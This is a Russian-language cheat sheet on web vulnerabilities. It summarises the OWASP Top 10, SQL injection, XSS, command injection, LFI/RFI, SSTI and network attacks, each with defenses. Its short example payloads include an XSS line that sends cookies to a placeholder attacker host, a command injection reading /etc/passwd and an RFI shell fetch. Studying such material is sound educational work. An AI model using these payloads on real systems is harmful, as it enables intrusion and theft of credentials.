# Уязвимости

## OWASP Top 10 (веб, 2021)
1. **Broken Access Control** — IDOR, обход авторизации (доступ к чужим объектам по id).
2. **Cryptographic Failures** — слабое/отсутствующее шифрование, пароли plaintext.
3. **Injection** — SQLi, command injection, LDAP injection.
4. **Insecure Design** — ошибки архитектуры безопасности.
5. **Security Misconfiguration** — дефолтные креды, listing, debug-режим, exposed `/admin`.
6. **Vulnerable Components** — устаревшие библиотеки/CMS с CVE.
7. **Identification & Auth Failures** — слабые пароли, брут, плохие сессии.
8. **Software & Data Integrity Failures** — небезопасные обновления, десериализация.
9. **Logging & Monitoring Failures** — нет логов/детекта.
10. **SSRF** — сервер делает запрос по URL атакующего (к внутренним сервисам).

## SQL-инъекция (SQLi)
Ввод пользователя попадает в SQL без санитизации.
- **Типы:** in-band (union, error-based), blind (boolean/time-based), out-of-band.
- Пример: `' OR '1'='1` в логине; `?id=1 UNION SELECT user,pass FROM users`.
- Инструмент: **sqlmap**. Защита: параметризованные запросы (prepared statements).

## XSS (Cross-Site Scripting)
Внедрение JS в страницу, исполняется у жертвы.
- **Reflected** (из запроса), **Stored** (в БД, бьёт всех), **DOM-based**.
- Пример: `<script>fetch('http://attacker/'+document.cookie)</script>` — кража cookie.
- Защита: экранирование вывода, CSP, HttpOnly cookie.

## Command Injection
Ввод попадает в системную команду. Пример: `ping 127.0.0.1; cat /etc/passwd`.
Обход фильтров — обфускация (`;`, `|`, `&&`, `$(...)`, backticks). Защита: не вызывать shell с вводом.

## CSRF (Cross-Site Request Forgery)
Жертва незаметно отправляет запрос от своего имени. Защита: CSRF-токены, SameSite cookie.

## IDOR / Broken Access Control
`GET /api/user/123` → меняем id на 124 → чужие данные. Защита: проверка прав на каждый объект.

## File Upload / LFI / RFI
- **File upload** — загрузка webshell (`.php`) при слабой проверке.
- **LFI** (Local File Inclusion) — `?page=../../etc/passwd` (path traversal).
- **RFI** — подключение удалённого файла (`?page=http://attacker/shell`).

## SSTI / Десериализация
- **SSTI** (Server-Side Template Injection) — `{{7*7}}` → 49 → RCE через шаблонизатор.
- **Insecure Deserialization** — вредоносный объект → RCE (Java, PHP, Python pickle).

## Слабая аутентификация
- Брут паролей (Hydra), дефолтные креды, переиспользование паролей.
- Слабые/предсказуемые токены сессий, JWT без проверки подписи.

## Сетевые/инфраструктурные
- **MITM / ARP-спуфинг**, **DNS poisoning**.
- **EternalBlue** (SMB, MS17-010), **BlueKeep** (RDP).
- Незащищённые сервисы (Redis/Mongo без auth), exposed `.git`.

## CVE и поиск эксплойтов
- **CVE** — идентификатор уязвимости (CVE-2023-30258). **CVSS** — оценка критичности 0–10.
- Поиск: `searchsploit <продукт>`, exploit-db.com, GitHub PoC, Metasploit (`search`).
- Всегда проверять версию ПО (nmap -sV) → искать CVE.

## Защита (общее)
Валидация ввода, параметризация, принцип наименьших привилегий, патчи, WAF, логирование, security headers (CSP, HSTS, X-Frame-Options).
